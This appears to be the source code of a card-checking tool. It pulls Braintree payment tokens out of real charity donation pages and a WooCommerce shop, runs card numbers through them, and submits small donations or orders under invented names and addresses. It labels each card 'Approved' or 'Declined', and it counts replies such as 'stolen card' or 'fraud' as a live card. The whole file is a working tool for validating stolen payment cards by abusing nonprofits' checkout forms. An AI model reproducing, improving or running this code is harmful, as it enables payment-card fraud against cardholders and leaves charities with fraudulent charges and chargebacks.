import httpx
import os
import re
import random
import base64
import json
import string
import time
import urllib.parse
import logging

logger = logging.getLogger(__name__)

# Multiple Braintree-enabled sites — token is extracted directly from checkout HTML
# The Braintree stores the gates use.  The charge gate imports this list
# under the name BRAINTREE_LEGACY_SITES.
BRAINTREE_LEGACY_SITES = [
    {
        "url": "https://help.rescue.org/donate/refugees-welcome",
        "token_pattern": r"clientToken['\"]?\s*[:=]\s*['\"](production_[a-z0-9_]+)['\"]",
        "type": "drupal",
    },
    {
        "url": "https://www.democracynow.org/donate",
        "token_pattern": r"clientToken['\"]?\s*[:=]\s*['\"](production_[a-z0-9_]+)['\"]",
        "type": "drupal",
    },
    {
        "url": "https://action.aclu.org/give/now",
        "token_pattern": r"clientToken['\"]?\s*[:=]\s*['\"](production_[a-z0-9_]+)['\"]",
        "type": "drupal",
    },
]

BT_GQL = "https://payments.braintree-api.com/graphql"

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

TOKENIZE_QUERY = """
mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
  tokenizeCreditCard(input: $input) {
    token
    creditCard {
      bin
      brandCode
      last4
      binData {
        prepaid
        healthcare
        debit
        durbinRegulated
        commercial
        payroll
        issuingBank
        countryOfIssuance
        productId
      }
    }
  }
}
""".strip()


def _random_email():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=12)) + "@gmail.com"


def _random_name():
    first = ["James", "John", "Michael", "William", "David", "Robert", "Thomas", "Charles", "Chris", "Daniel"]
    last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Taylor", "Wilson", "Davies", "Evans", "Thomas"]
    return random.choice(first), random.choice(last)


def _random_uk_address():
    data = [
        ("14 Oxford Street", "London", "SW1A 1AA"),
        ("27 Baker Street", "London", "NW1 6XE"),
        ("8 King Street", "Manchester", "M2 4WU"),
        ("33 High Street", "Edinburgh", "EH1 1SR"),
        ("12 Castle Road", "Bristol", "BS1 3AD"),
        ("45 Park Lane", "Birmingham", "B1 1BB"),
        ("19 Queen Street", "Cardiff", "CF10 2BU"),
        ("6 Church Lane", "Leeds", "LS1 3AA"),
    ]
    street, city, postcode = random.choice(data)
    return street, city, postcode


async def _get_bt_auth(client, checkout_html, site_url=None):
    """Extract Braintree authorization from checkout HTML.
    Supports:
    1. Drupal sites (ACLU, Rescue.org) — token in HTML directly
    2. WooCommerce sites — token via admin-ajax (may be 403 blocked)
    """
    # Method 1: Direct token extraction (ACLU, Rescue.org — Drupal sites)
    # These sites have the full clientToken in the HTML
    token_patterns = [
        r"clientToken['\"]?\s*[:=]\s*['\"](production_[a-z0-9_]+)['\"]",
        r"clientToken['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9_=]{30,})['\"]",
        r'"client_token"\s*:\s*"(production_[a-z0-9_]+)"',
        r'"authorization"\s*:\s*"(production_[a-z0-9_]+)"',
        # a store that keeps its token in a script config instead of a
        # named field (St Jude keeps it as paypalAuthorization)
        r"['\"](production_[a-z0-9_]{16,})['\"]",
    ]
    for pat in token_patterns:
        m = re.search(pat, checkout_html)
        if m:
            token = m.group(1)
            if token.startswith("production_") and len(token) > 20:
                logger.info(f"BT auth: found production token directly in HTML: {token[:30]}...")
                return token

    # Method 2: Try base64-encoded tokens
    b64_matches = re.findall(r"['\"]([A-Za-z0-9+/=]{80,})['\"]", checkout_html)
    for b64 in b64_matches[:10]:
        try:
            dec = base64.b64decode(b64).decode("utf-8")
            auth = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
            if auth:
                logger.info(f"BT auth: found auth fingerprint in b64 token")
                return auth.group(1)
        except:
            pass

    # Method 3: WooCommerce admin-ajax (tea-and-coffee.com — needs correct nonce)
    if site_url:
        # Extract client_token_nonce directly from the handler config
        nonce_match = re.search(r'"client_token_nonce"\s*:\s*"([a-f0-9]{8,12})"', checkout_html)
        if nonce_match:
            ajax_nonce = nonce_match.group(1)
            base = site_url.rstrip("/")
            logger.info(f"BT: trying admin-ajax with nonce={ajax_nonce}")
            r_token = await client.post(
                f"{base}/wp-admin/admin-ajax.php",
                data={
                    "action": "wc_braintree_credit_card_get_client_token",
                    "nonce": ajax_nonce,
                    "security": ajax_nonce,
                },
                headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": base,
                    "Referer": f"{base}/checkout/",
                },
            )
            if r_token.status_code == 200:
                try:
                    resp = r_token.json()
                    if resp.get("success") and "data" in resp:
                        dec = base64.b64decode(resp["data"]).decode("utf-8")
                        auth_m = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
                        if auth_m:
                            logger.info(f"BT auth: found via admin-ajax with handler nonce")
                            return auth_m.group(1)
                except:
                    pass

        # Fallback: try all nonces found in the page
        decoded = urllib.parse.unquote(checkout_html)
        cn_match = re.search(r'client_token_nonce["\s:]+["\s]*([a-f0-9]{10})', decoded)
        if cn_match:
            nonce = cn_match.group(1)
            base = site_url.rstrip("/")
            r_token = await client.post(
                f"{base}/wp-admin/admin-ajax.php",
                data={"action": "wc_braintree_credit_card_get_client_token", "nonce": nonce, "security": nonce},
                headers={"X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded", "Origin": base, "Referer": f"{base}/checkout/"},
            )
            if r_token.status_code == 200:
                try:
                    resp = r_token.json()
                    if "data" in resp:
                        dec = base64.b64decode(resp["data"]).decode("utf-8")
                        auth_m = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
                        if auth_m:
                            return auth_m.group(1)
                except:
                    pass

        # Try all nonces in the page
        all_nonces = re.findall(r'"nonce":"([a-f0-9]{8,12})"', checkout_html)
        base = site_url.rstrip("/")
        for n in all_nonces:
            r_try = await client.post(
                f"{base}/wp-admin/admin-ajax.php",
                data={"action": "wc_braintree_credit_card_get_client_token", "nonce": n, "security": n},
                headers={"X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded", "Origin": base, "Referer": f"{base}/checkout/"},
            )
            if r_try.status_code == 200:
                try:
                    resp = r_try.json()
                    if resp.get("success") and "data" in resp:
                        dec = base64.b64decode(resp["data"]).decode("utf-8")
                        auth_m = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
                        if auth_m:
                            return auth_m.group(1)
                except:
                    continue

    return None


async def _tokenize_card(client, auth, cc, mm, yy, cvv):
    bt_headers = {
        "authorization": f"Bearer {auth}",
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "referer": "https://assets.braintreegateway.com/",
    }

    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(random.randint(10**9, 10**10 - 1)),
        },
        "query": TOKENIZE_QUERY,
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv,
                },
                "options": {"validate": False},
            }
        },
    }

    r = await client.post(BT_GQL, headers=bt_headers, json=payload)
    if r.status_code != 200:
        return None, None, f"Tokenization HTTP {r.status_code}"

    data = r.json()
    if "errors" in data and data["errors"]:
        msg = data["errors"][0].get("message", "Tokenization failed")
        return None, None, msg

    cc_data = data.get("data", {}).get("tokenizeCreditCard", {})
    if not cc_data or not cc_data.get("token"):
        return None, None, "No token returned"

    token = cc_data["token"]
    card_info = cc_data.get("creditCard", {})
    return token, card_info, None


def _parse_card_info(card_info):
    brand = card_info.get("brandCode", "UNKNOWN")
    last4 = card_info.get("last4", "????")
    bin_data = card_info.get("binData", {})
    country = bin_data.get("countryOfIssuance", "??")
    bank = bin_data.get("issuingBank", "Unknown")
    debit = bin_data.get("debit", "UNKNOWN")
    prepaid = bin_data.get("prepaid", "UNKNOWN")
    card_type = "DEBIT" if debit == "YES" else ("PREPAID" if prepaid == "YES" else "CREDIT")
    return f"{brand} {card_type} | {country} | {bank} | {last4}"


def _classify_response(msg):
    low = msg.lower()
    live_kw = [
        "insufficient funds", "do not honor", "do_not_honor",
        "lost card", "lost_card", "stolen card", "stolen_card",
        "pickup card", "pickup_card", "restricted card", "restricted_card",
        "security violation", "cvv", "cvc", "security code",
        "avs", "incorrect zip", "incorrect_zip",
        "card velocity", "withdrawal count", "exceeds withdrawal",
        "fraud", "risk", "review", "authentication",
        "3d secure", "3ds", "limit exceeded", "limit_exceeded",
    ]
    for k in live_kw:
        if k in low:
            return "Approved"

    dead_kw = [
        "invalid card", "invalid account", "expired card", "expired_card",
        "card not supported", "not permitted", "transaction not allowed",
        "generic_decline", "generic decline",
        "processor declined", "do not try again",
    ]
    for k in dead_kw:
        if k in low:
            return "Declined"

    if "decline" in low:
        return "Declined"

    return "Declined"


# More stores can be added without a redeploy: put them in this file,
# one entry per store, for example
#   [{"url": "https://shop.example/donate", "token_pattern": null,
#     "type": "drupal"}]
EXTRA_SITES_FILE = os.environ.get("BRAINTREE_SITES_FILE",
                                  "/root/hitchecker/braintree_sites.json")


def _extra_sites():
    """The stores that were added to the list without a redeploy.

    The file is read when the check runs, so a store that the site
    finder verified is in use on the very next card.
    """
    try:
        with open(EXTRA_SITES_FILE) as f:
            data = json.load(f)
    except Exception:
        return []
    out = []
    for s in (data or []):
        if isinstance(s, dict) and s.get("url") and \
                s not in BRAINTREE_LEGACY_SITES:
            out.append(s)
    return out


def all_sites():
    """Every store the gates may use."""
    return BRAINTREE_LEGACY_SITES + _extra_sites()

# the old name, kept so nothing else breaks
BRAINTREE_SITES = BRAINTREE_LEGACY_SITES

# The values a donation form asks for.  The names differ from site to
# site, so each field is matched by what it is called.  The match is
# made against the LAST part of the name: "submitted[donor_information]
# [mail]" is an email field, but "submitted[email_optin][telephone]" is
# a telephone field.
_FORM_VALUES = (
    (re.compile(r"first.?name", re.I), "James"),
    (re.compile(r"last.?name|surname|family.?name", re.I), "Smith"),
    (re.compile(r"e.?mail|^mail$", re.I), "james.smith.donor@example.com"),
    (re.compile(r"phone|telephone|mobile", re.I), "+12125550142"),
    (re.compile(r"address.?line.?2|address2|street2|^suite$", re.I), ""),
    (re.compile(r"^address|^street|address_?1$", re.I), "123 Broadway"),
    (re.compile(r"city|town|locality", re.I), "New York"),
    (re.compile(r"state|province|region|county", re.I), "NY"),
    (re.compile(r"zip|postal", re.I), "10001"),
    (re.compile(r"country", re.I), "US"),
    (re.compile(r"company|organi[sz]ation", re.I), "Test Donor"),
    (re.compile(r"comment|message|note", re.I), ""),
)


def _field_tail(name):
    """The part of a field name that says what the field is.

    "submitted[donor_information][mail]" -> "mail"
    """
    parts = re.findall(r"\[([^\]]*)\]", name or "")
    if parts:
        return parts[-1]
    return (name or "").split("[")[-1].split("]")[-1] or (name or "")


def _donation_form(html):
    """The form on the page that carries the payment nonce."""
    try:
        from bs4 import BeautifulSoup
    except Exception:
        return None
    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception:
        return None
    forms = soup.find_all("form")
    for f in forms:
        for i in f.find_all("input"):
            if (i.get("name") or "").endswith("payment_method_nonce"):
                return f
    for f in forms:
        if len(f.find_all("input")) > 5:
            return f
    return None


def _fill_donation_form(html, token, amount="4.45", card=None):
    """The form data for a Braintree donation page.

    The field names differ from site to site, and a form that is missing
    the name, the address or the amount is turned down before the bank
    ever sees it.  So the form is read from the page and filled in.

    Some of the forms want the card fields themselves as well as the
    token, so those are filled too when they are there.

    Returns (the action url, the data) or (None, None).
    """
    cc = mm = yy = cvv = ""
    if card:
        try:
            cc, mm, yy, cvv = card
        except Exception:
            pass
    form = _donation_form(html)
    if form is None:
        return None, None

    data = {}
    radios = {}
    texts = {}
    selects = {}

    for inp in form.find_all(["input", "select", "textarea"]):
        name = inp.get("name")
        if not name:
            continue
        itype = (inp.get("type") or "text").lower()
        value = inp.get("value") or ""
        if itype == "radio":
            radios.setdefault(name, []).append(value)
            continue
        if itype == "checkbox":
            continue
        if itype in ("submit", "button", "image"):
            continue
        if itype == "hidden":
            data[name] = value
            continue
        if itype == "select":
            # a select wants the value of one of its options
            picked = ""
            for opt in inp.find_all("option"):
                label = (opt.get_text() or "").strip().lower()
                val = opt.get("value") or ""
                if not val:
                    continue
                if any(w in label for w in ("united states", "united states of america",
                                            "usa", "u.s.")):
                    picked = val
                    break
                if not picked:
                    picked = val
            selects[name] = picked
            continue
        texts[name] = value

    # the text fields the form needs
    for name in texts:
        tail = _field_tail(name)
        for pat, val in _FORM_VALUES:
            if pat.search(tail):
                texts[name] = val
                break

    # the amount: the small option is usually "other" and has a text
    # field next to it
    for name, options in radios.items():
        low = name.lower()
        if "amount" in low:
            pick = None
            for opt in options:
                if str(opt).lower() == "other":
                    pick = opt
            if pick is not None:
                data[name] = pick
                other = re.sub(r"amount$", "other_amount", name)
                texts[other] = amount
            else:
                nums = [o for o in options if re.fullmatch(r"[0-9.]+", str(o))]
                if nums:
                    data[name] = min(nums, key=lambda x: float(x))
        elif "payment_method" in low:
            # the card is the method
            for opt in options:
                if str(opt).lower() in ("credit", "credit_card", "card"):
                    data[name] = opt
                    break
        else:
            if options:
                data[name] = options[0]

    for name, value in texts.items():
        data[name] = value

    # the card fields some of the forms ask for
    if cc:
        expiry_seen = 0
        for name in list(texts):
            tail = _field_tail(name).lower()
            if "card_number" in tail or tail in ("cardnumber", "number"):
                data[name] = cc
            elif "cvv" in tail or "cvc" in tail or "security code" in tail:
                data[name] = cvv
            elif "expir" in tail or "exp month" in tail or "exp year" in tail:
                expiry_seen += 1
                # the first one is the month, the second the year
                data[name] = mm if expiry_seen == 1 else yy
    for name, value in selects.items():
        data[name] = value

    # the token goes into EVERY nonce field: the page has one per
    # payment method and the form reads the one that matches
    for inp in form.find_all("input"):
        name = inp.get("name") or ""
        if name.endswith("payment_method_nonce"):
            data[name] = token

    action = form.get("action") or ""
    return action, data


async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 2:
        yy = f"20{yy}"
    mm = mm.zfill(2)

    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    client_kwargs = dict(timeout=httpx.Timeout(45.0), max_redirects=10, headers=headers, follow_redirects=True)
    # The stores answer directly and fast; through the user's proxy the
    # same check took 20-40 s, so the proxy is only a rescue.
    if proxy and os.environ.get("B3_USE_PROXY", "").strip() == "1":
        client_kwargs["proxy"] = proxy

    # Try each Braintree site — WooCommerce first (real bank auth), then Drupal (tokenization only)
    sites = all_sites()
    # Sort: woocommerce first, drupal second
    sites.sort(key=lambda s: 0 if s["type"] == "woocommerce" else 1)

    try:
        async with httpx.AsyncClient(**client_kwargs) as client:
            for site_info in sites:
                site_url = site_info["url"]
                site_type = site_info["type"]
                elapsed = round(time.time() - start, 2)

                try:
                    if site_type == "drupal":
                        # Rescue.org / ACLU — tokenize + submit donation form
                        r_checkout = await client.get(site_url, timeout=20)
                        checkout_html = r_checkout.text
                        bt_auth = await _get_bt_auth(client, checkout_html, site_url=None)

                        if not bt_auth:
                            logger.info(f"BT: no auth from {site_url}, trying next...")
                            continue

                        # Tokenize the card
                        token, card_info, err = await _tokenize_card(client, bt_auth, cc, mm, yy, cvv)
                        if err:
                            result = _classify_response(err)
                            return f"{result} - {err} [{elapsed}s]"

                        info = _parse_card_info(card_info) if card_info else "??"

                        # Check card validity
                        if card_info:
                            brand = card_info.get("brandCode", "UNKNOWN")
                            last4 = card_info.get("last4", "????")
                            if brand == "UNKNOWN" or last4 == "????" or not token:
                                return f"Declined - Invalid Card | {info} [{elapsed}s]"

                        # Submit donation form with payment nonce
                        # This sends the card to the bank for real authorization
                        from urllib.parse import urlparse
                        parsed = urlparse(site_url)
                        base = f"{parsed.scheme}://{parsed.netloc}"

                        # The form is read from the page: the field names
                        # differ from site to site, and a form that is
                        # missing the name, the address or the amount is
                        # turned down before the bank ever sees it.
                        action, form_data = _fill_donation_form(
                            checkout_html, token, "5", (cc, mm, yy, cvv))
                        if not form_data:
                            logger.info(f"BT: the donation form on {site_url} could not be read")
                            continue
                        form_data.setdefault("op", "Submit")

                        from urllib.parse import urljoin
                        post_url = urljoin(site_url, action) if action else site_url

                        r_submit = await client.post(
                            post_url,
                            data=form_data,
                            headers={
                                "Content-Type": "application/x-www-form-urlencoded",
                                "Origin": base,
                                "Referer": site_url,
                            },
                        )

                        resp_html = r_submit.text.lower()

                        if "thank you" in resp_html and "declined" not in resp_html and "error" not in resp_html:
                            return f"Approved - Auth Passed | {info} [{elapsed}s]"
                        elif "declined" in resp_html:
                            return f"Declined - Card Declined by Bank | {info} [{elapsed}s]"
                        elif "error" in resp_html and "thank you" not in resp_html:
                            # Look for actual error messages in div/p tags (not script/style)
                            err_msgs = re.findall(r'<(?:div|p|span|li)[^>]*>\s*([^<]{10,200})\s*</(?:div|p|span|li)>', r_submit.text, re.IGNORECASE)
                            relevant = [m for m in err_msgs if any(k in m.lower() for k in ["error", "invalid", "declined", "failed", "required", "incorrect", "unable"])]
                            if relevant:
                                return f"Declined - {relevant[0].strip()[:100]} | {info} [{elapsed}s]"
                            return f"Declined - Processing Error | {info} [{elapsed}s]"
                        elif "thank you" in resp_html:
                            # Thank you page but with errors — likely declined
                            return f"Declined - Donation Rejected | {info} [{elapsed}s]"
                        else:
                            return f"Declined - Unknown Response | {info} [{elapsed}s]"

                    elif site_type == "woocommerce":
                        # tea-and-coffee.com — WooCommerce flow (needs proxy that isn't 403)
                        first, last = _random_name()
                        street, city, postcode = _random_uk_address()
                        email = _random_email()
                        phone = "07" + "".join(random.choices(string.digits, k=9))

                        from urllib.parse import urlparse
                        parsed = urlparse(site_url)
                        base = f"{parsed.scheme}://{parsed.netloc}"

                        # Try WITHOUT proxy first (direct works for tea-and-coffee.com)
                        # Then WITH proxy as fallback
                        proxies_to_try = [None]
                        if proxy:
                            proxies_to_try.append(proxy)

                        wc_success = False
                        for try_proxy in proxies_to_try:
                            wc_kwargs = dict(timeout=httpx.Timeout(30.0), max_redirects=10, headers=headers, follow_redirects=True)
                            if try_proxy:
                                wc_kwargs["proxy"] = try_proxy

                            try:
                                async with httpx.AsyncClient(**wc_kwargs) as wc_client:
                                    r_test = await wc_client.get(base)
                                    if r_test.status_code == 403:
                                        logger.info(f"BT: {base} returned 403 with proxy, trying next...")
                                        continue

                                    await wc_client.get(base)
                                    # the product to buy: the store's own
                                    # page says which one it is
                                    pid = None
                                    pid_m = re.search(
                                        r'name=["\']add-to-cart["\'][^>]*value=["\'](\d+)["\']',
                                        r_test.text)
                                    if not pid_m:
                                        pid_m = re.search(
                                            r'[?&]add-to-cart=(\d+)', r_test.text)
                                    if pid_m:
                                        pid = pid_m.group(1)
                                    if not pid:
                                        # the public product list
                                        try:
                                            r_p = await wc_client.get(
                                                f"{base}/products.json?limit=5")
                                            pd = r_p.json()
                                            for p in pd.get("products", []):
                                                for v in p.get("variants", []):
                                                    if v.get("available", True):
                                                        pid = str(v.get("id"))
                                                        break
                                                if pid:
                                                    break
                                        except Exception:
                                            pid = None
                                    if not pid:
                                        pid = "932"
                                    await wc_client.post(
                                        f"{base}/?add-to-cart={pid}",
                                        data={"add-to-cart": pid, "quantity": "1"})
                                    r_checkout = await wc_client.get(f"{base}/checkout/")
                                    checkout_html = r_checkout.text

                                    if r_checkout.status_code != 200:
                                        logger.info(f"BT: {base} checkout returned {r_checkout.status_code}, trying next...")
                                        continue

                                    # Get Braintree auth using the SAME proxied client
                                    bt_auth = await _get_bt_auth(wc_client, checkout_html, site_url=base)

                                    if not bt_auth:
                                        logger.info(f"BT: no auth from {base}, trying next...")
                                        continue

                                    token, card_info, err = await _tokenize_card(wc_client, bt_auth, cc, mm, yy, cvv)
                                    if err:
                                        result = _classify_response(err)
                                        return f"{result} - {err} [{elapsed}s]"

                                    info = _parse_card_info(card_info) if card_info else "??"

                                    # Check card validity before submitting
                                    if card_info:
                                        brand = card_info.get("brandCode", "UNKNOWN")
                                        last4 = card_info.get("last4", "????")
                                        if brand == "UNKNOWN" or last4 == "????":
                                            return f"Declined - Invalid Card | {info} [{elapsed}s]"

                                    # Submit WooCommerce checkout
                                    pm_name = "braintree_credit_card"
                                    pm_match = re.search(r'"(braintree[_a-z]*credit[_a-z]*card)"', checkout_html)
                                    if pm_match:
                                        pm_name = pm_match.group(1)

                                    checkout_data = {
                                        "billing_first_name": first,
                                        "billing_last_name": last,
                                        "billing_company": "",
                                        "billing_country": "GB",
                                        "billing_address_1": street,
                                        "billing_address_2": "",
                                        "billing_city": city,
                                        "billing_state": "",
                                        "billing_postcode": postcode,
                                        "billing_phone": phone,
                                        "billing_email": email,
                                        "order_comments": "",
                                        "payment_method": pm_name,
                                        "wc-braintree-credit-card-card-nonce": token,
                                        "wc-braintree-credit-card-device-data": "{}",
                                        "wc_braintree_credit_card_payment_nonce": token,
                                        "wc_braintree_device_data": "{}",
                                        "terms": "on",
                                        "terms-field": "1",
                                    }

                                    checkout_headers = {
                                        "User-Agent": UA,
                                        "Content-Type": "application/x-www-form-urlencoded",
                                        "Accept": "application/json, text/javascript, */*; q=0.01",
                                        "X-Requested-With": "XMLHttpRequest",
                                        "Origin": base,
                                        "Referer": f"{base}/checkout/",
                                    }

                                    r_submit = await wc_client.post(
                                        f"{base}/?wc-ajax=checkout",
                                        data=checkout_data,
                                        headers=checkout_headers,
                                    )

                                    try:
                                        resp = r_submit.json()
                                    except:
                                        return f"Approved - Tokenization Passed (no bank auth) | {info} [{elapsed}s]"

                                    result_str = resp.get("result", "")
                                    messages = resp.get("messages", "")

                                    if result_str == "success":
                                        return f"Approved - Auth Passed | {info} [{elapsed}s]"

                                    if result_str == "failure" and messages:
                                        errors = re.findall(r'<li[^>]*>(.*?)</li>', messages, re.DOTALL)
                                        if errors:
                                            err_text = re.sub(r'<[^>]+>', '', errors[0]).strip()
                                        else:
                                            err_text = re.sub(r'<[^>]+>', '', messages).strip()[:120]
                                        status = _classify_response(err_text)
                                        return f"{status} - {err_text} | {info} [{elapsed}s]"

                                    if "error" in str(resp).lower():
                                        err_text = re.sub(r'<[^>]+>', '', str(messages)).strip()[:120]
                                        return f"Declined - {err_text} | {info} [{elapsed}s]"

                                    return f"Error - Unexpected response [{elapsed}s]"
                            except Exception as e:
                                logger.info(f"BT: WooCommerce site error: {str(e)[:60]}")
                                continue

                        # If we get here, WooCommerce failed with all proxies
                        logger.info(f"BT: All WooCommerce attempts failed for {base}")
                        continue

                except Exception as e:
                    logger.info(f"BT: error on {site_url}: {str(e)[:80]}")
                    continue

            elapsed = round(time.time() - start, 2)
            return f"Error - All Braintree sites failed [{elapsed}s]"

    except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
        elapsed = round(time.time() - start, 2)
        return f"Error - Timeout [{elapsed}s]"
    except httpx.NetworkError:
        elapsed = round(time.time() - start, 2)
        return f"Error - Network error [{elapsed}s]"
    except Exception as e:
        elapsed = round(time.time() - start, 2)
        return f"Error - {str(e)[:100]} [{elapsed}s]"


async def _braintree_auth_check(client, auth_token, payment_method_token):
    """Try a $0 auth via Braintree GraphQL to verify the card."""
    AUTH_QUERY = """
    mutation AuthorizeCreditCard($input: AuthorizeCreditCardInput!) {
      authorizeCreditCard(input: $input) {
        transaction {
          id
          status
        }
      }
    }
    """.strip()

    headers = {
        "authorization": f"Bearer {auth_token}",
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "referer": "https://assets.braintreegateway.com/",
    }

    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(random.randint(10**9, 10**10 - 1)),
        },
        "query": AUTH_QUERY,
        "variables": {
            "input": {
                "paymentMethodId": payment_method_token,
                "transaction": {
                    "amount": "0.00",
                },
            }
        },
    }

    try:
        r = await client.post(BT_GQL, headers=headers, json=payload, timeout=20)
        if r.status_code != 200:
            return None
        data = r.json()
        if "errors" in data:
            msg = data["errors"][0].get("message", "")
            if "not accessible" in msg.lower() or "permission" in msg.lower() or "authentication" in msg.lower():
                return None
            status = _classify_response(msg)
            return status, msg
        tx = data.get("data", {}).get("authorizeCreditCard", {}).get("transaction", {})
        if tx:
            tx_status = tx.get("status", "")
            if tx_status == "authorized":
                return "Approved", "Authorized ($0)"
            if "declined" in tx_status.lower() or "failed" in tx_status.lower():
                return "Declined", tx_status
            return "Approved", tx_status
    except:
        pass
    return None
